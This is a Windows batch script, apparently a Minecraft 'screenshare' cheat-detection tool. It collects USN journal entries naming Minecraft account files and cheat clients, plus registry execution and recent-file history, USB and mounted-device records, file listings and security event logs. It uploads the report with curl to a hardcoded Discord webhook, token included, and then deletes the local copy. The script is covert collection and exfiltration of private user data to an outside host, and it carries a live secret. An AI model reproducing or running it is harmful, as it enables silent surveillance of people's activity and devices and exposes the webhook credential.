@echo off
setlocal enabledelayedexpansion

set "L=%temp%\Report_SS_%username%.txt"

echo [!] TARGET: %username% - %date% %time% > "%L%"
echo ------------------------------------------------ >> "%L%"

fsutil usn readjournal C: csv | findstr /i /C:"0x80000200" | findstr /i /C:"latest.log" /i /C:".log.gz" /i /C:"launcher_profiles.json" /i /C:"usernamecache.json" /i /C:"usercache.json" /i /C:"shig.inima" /i /C:"launcher_accounts.json" /i /C:"launcher_profiles_microsoft_store.json" /i /C:"lunar" /i /C:"badlion" >> "%L%" 2>nul

fsutil usn readjournal c: csv | findstr /i /C:"0x80000200" /i /C:"0x00001000" /i /C:"0x00002000" | findstr /i /C:".pf" /i /C:".exe" /i /C:".bat" /i /C:".cmd" /i /C:".jar" /i /C:".pif" /i /C:"jnativehook" /i /C:"vape" /i /C:"drip" /i /C:"itami" >> "%L%" 2>nul

reg query "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /s >> "%L%" 2>nul
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /s >> "%L%" 2>nul
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU" /s >> "%L%" 2>nul
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU" /s >> "%L%" 2>nul
reg query "HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings" /s >> "%L%" 2>nul
reg query "HKLM\SYSTEM\ControlSet001\Enum\USB" /s >> "%L%" 2>nul
reg query "HKLM\SYSTEM\MountedDevices" >> "%L%" 2>nul
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /s >> "%L%" 2>nul
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppBadgeUpdated" /s >> "%L%" 2>nul
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView" /s >> "%L%" 2>nul

dir /s /b "%temp%\JNativeHook*" >> "%L%" 2>nul
dir /s /b "%appdata%\.minecraft\launcher_accounts.json" >> "%L%" 2>nul
dir /s /b "%appdata%\.minecraft\versions\*\*.json" >> "%L%" 2>nul
dir /s /b "%userprofile%\Downloads\*.jar" >> "%L%" 2>nul
dir /s /b "%userprofile%\Desktop\*.exe" >> "%L%" 2>nul

wevtutil qe Security /q:"*[System[(EventID=1102)]]" /f:text /c:1 >> "%L%" 2>nul
wevtutil qe Security /q:"*[System[(EventID=4616)]]" /f:text /c:1 >> "%L%" 2>nul
wevtutil qe System /q:"*[System[(EventID=104)]]" /f:text /c:1 >> "%L%" 2>nul

curl -X POST -F "file=@%L%" -F "payload_json={\"content\": \"**REPORT SS GENERATO**\nTarget: `%username%`\"}" "https://discord.com/api/webhooks/1488243848496025731/WxeXkRYRM3QgUH-2gxFLf467nJZOSyBi7Uuk_rh-d71Pam1BgF6wN1si3imYYciR5pDT"

del "%L%"
exit
